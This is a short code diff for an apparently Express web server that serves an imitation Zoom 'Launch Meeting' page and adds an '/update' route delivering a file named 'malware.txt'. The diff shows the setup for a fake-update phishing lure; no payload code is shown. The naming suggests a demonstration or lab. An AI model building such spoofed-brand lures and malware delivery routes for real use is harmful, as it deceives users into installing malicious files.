@@ -22,3 +22,7 @@ app.listen(PORT, HOST, () => {
 app.get('/', (req, res) => {
 	res.sendFile(ZOOM_PATH+"/Launch Meeting - Zoom.html");
 });
+
+app.get('/update', (req, res) => {
+	res.sendFile(ZOOM_PATH+"/malware.txt");
+});
